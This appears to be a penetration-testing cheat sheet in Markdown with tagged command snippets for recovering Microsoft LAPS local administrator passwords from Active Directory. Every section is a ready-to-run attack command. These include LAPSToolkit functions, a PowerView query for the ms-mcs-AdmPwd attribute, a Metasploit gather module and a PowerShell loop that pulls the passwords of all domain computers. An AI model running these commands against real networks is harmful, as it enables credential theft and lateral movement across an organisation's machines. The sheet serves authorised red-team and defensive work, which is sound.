# LAPS

% laps, password

## get laps passwords
#platform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER  
```
Get-LAPSPasswords -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSize
```

## get laps computer list
```powershell
Import-Module .\LAPSToolkit.ps1
Get-LAPSComputers
```

## find the list of group who can manipulate SAM data
```powershell
Import-Module .\LAPSToolkit.ps1
Find-LAPSDelegatedGroups
```

## powerview get laps password
```powershell
Get-DomainObject <computer> -Properties "ms-mcs-AdmPwd",name
```

## metasploit get laps password
```
use windows/gather/credentials/enum_laps
```

## get all machine passwords
#platform/linux #target/remote #cat/POSTEXPLOIT/CREDS_RECOVER 
```
foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}
```
